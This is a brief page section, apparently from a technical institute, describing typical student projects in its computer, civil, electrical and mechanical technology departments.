Projects

Computer Information Technology(CIT):

In CIT students work on projects like website development using HTML, CSS, and JavaScript, database management using MySQL, and simple computer applications in languages like C++ and Python. These projects enhance their skills in software development and IT support.

Civil Technology(CT):

In the Civil Technology students are involved in projects such as building design using AutoCAD, estimation and costing of construction work, and small-scale structural models. These projects help students understand real-world civil engineering practices.

Electrical Technology(ET):

In Electrical Technology students create projects like home wiring models, solar panel systems, basic circuit designs, and motor control panels. These help them gain practical knowledge of electrical installations and safety procedures.

Mechanical Technology(MT):

In the Mechanical Technology students work on projects like lathe machine operations, basic engine models, gear systems, and mechanical drawing. These projects develop their skills in machinery handling and mechanical design.
